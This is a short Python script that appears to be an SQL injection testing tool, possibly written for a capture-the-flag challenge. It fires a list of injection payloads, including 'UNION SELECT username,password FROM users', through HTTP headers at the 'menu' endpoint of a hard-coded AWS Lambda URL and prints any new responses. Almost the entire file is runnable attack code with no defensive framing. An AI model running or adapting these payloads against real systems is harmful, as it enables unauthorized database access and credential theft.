import requests
import json
from urllib.parse import urljoin

class SQLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.menu_url = urljoin(base_url, 'menu')
        self.seen_responses = set()

    def make_request(self, headers=None):
        default_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        if headers:
            default_headers.update(headers)

        try:
            response = requests.options(self.menu_url, headers=default_headers, timeout=5)
            response_hash = hash(response.text)

            if response_hash not in self.seen_responses:
                self.seen_responses.add(response_hash)
                print(f"\n[!] Interesting Response - Status Code: {response.status_code}")
                print(f"Response Headers: {response.headers}")
                print(f"Response Body: {response.text[:200]}")
                
            return response
        except Exception as e:
            print(f"Error: {str(e)}")
            return None

    def test_sql_injection(self):
        payloads = [
            "' OR 1=1--",
            "' UNION SELECT null--",
            "' UNION SELECT username,password FROM users--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' OR EXISTS(SELECT * FROM information_schema.tables)--",
            "' OR '1'='1",
            '" OR "1"="1',
            "') OR ('1'='1",
            '`) OR (`1`=`1'
        ]

        for payload in payloads:
            print(f"\n[+] Testing payload: {payload}")
            self.make_request(headers={"X-Forwarded-For": payload})
            self.make_request(headers={"Referer": payload})
            self.make_request(headers={"User-Agent": payload})
            self.make_request(headers={"Authorization": f"Bearer {payload}"})

if __name__ == "__main__":
    tester = SQLInjectionTester('https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws')
    tester.test_sql_injection()
